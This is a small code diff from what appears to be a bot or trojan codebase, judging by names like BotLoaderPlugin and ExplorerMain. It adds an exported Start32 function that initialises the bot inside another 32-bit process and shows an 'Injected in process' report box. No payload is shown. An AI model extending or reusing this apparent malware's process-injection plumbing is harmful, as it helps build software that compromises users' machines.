@@ -245,8 +245,25 @@ extern"C"  void WINAPI Start(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin)
 			BOT::SetBotType(BotLoaderPlugin);
 	}
 	if (Start)
-		StartThread(ExplorerMain, NULL);
+	{
+		HANDLE H = StartThread(ExplorerMain, NULL);
+	}
 }
+
+
+//-----------------------------------------------------------
+//  Start32 - Экспортируемая функция, запуска плагина
+//            в 32 разрядном процессе 
+//-----------------------------------------------------------
+DWORD WINAPI Start32(LPVOID)
+{
+	BOT::Initialize();
+	string Message;
+	Message.Format("Injected in process %s", Bot->ApplicationName().t_str());
+	pMessageBoxA(0, Message.t_str(), "Inject report", 0);
+	return 0;
+}
+
 
 
 //-----------------------------------------------------------
